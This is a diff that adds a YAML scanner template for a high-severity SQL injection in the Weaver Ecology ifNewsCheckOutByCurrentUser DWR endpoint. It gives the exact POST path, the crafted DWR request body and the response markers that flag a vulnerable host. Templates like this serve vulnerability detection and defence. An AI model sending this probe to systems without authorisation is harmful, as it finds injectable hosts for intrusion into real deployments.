@@ -1,0 +1,29 @@
+id: weaver-ecology-ifnewscheckoutbycurrentuser-dwr-sqli
+info:
+  name: 泛微 Ecology ifnewscheckoutbycurrentuser 接口 - SQL 注入漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: weaver
+    product: ecology
+  tags: sqli,vuln,weaver,ecology
+http:
+- method: POST
+  path:
+  - '{{BaseURL}}/dwr/exec/DocDwrUtil.ifNewsCheckOutByCurrentUser'
+  headers:
+    Content-Type: text/plain
+  body: |-
+    callCount=1
+    c0-scriptName=DocDwrUtil
+    c0-methodName=ifNewsCheckOutByCurrentUser
+    c0-id=3561_1691581516970
+    c0-param0=string:
+    c0-param1=number:123
+    xml=true
+  matchers:
+  - type: dsl
+    dsl:
+    - 'contains(body, "DWREngine._handleResponse") && contains(body, "var s0 = false") && contains(body, "3561_1691581516970")'
